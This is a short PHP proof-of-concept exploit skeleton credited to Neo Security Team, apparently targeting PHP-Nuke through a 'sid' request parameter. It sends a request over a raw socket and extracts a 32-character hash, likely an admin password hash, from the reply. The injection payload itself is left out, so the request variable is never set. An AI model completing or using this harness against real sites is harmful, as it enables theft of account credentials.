<?
/*

Neo Security Team - Pseudo-Code Proof of Concept Exploit
http://www.neosecurityteam.net
Paisterist

*/
set_time_limit(0);
$host="localhost";
$path="/phpnuke/";
$port="80";
$fp = fsockopen($host, $port, $errno, $errstr, 30);

if ($fp) {
    /* we put the GET request on $p variable, with "sid" containing. */

    fwrite($fp, $p);

    while (!feof($fp)) {
        $content .= fread($fp, 4096);
    }

    preg_match("/([a-z0-9]{32})/", $content, $matches);

    if ($matches[0])
    print "<b>Hash: </b>".$matches[0];
}
?>
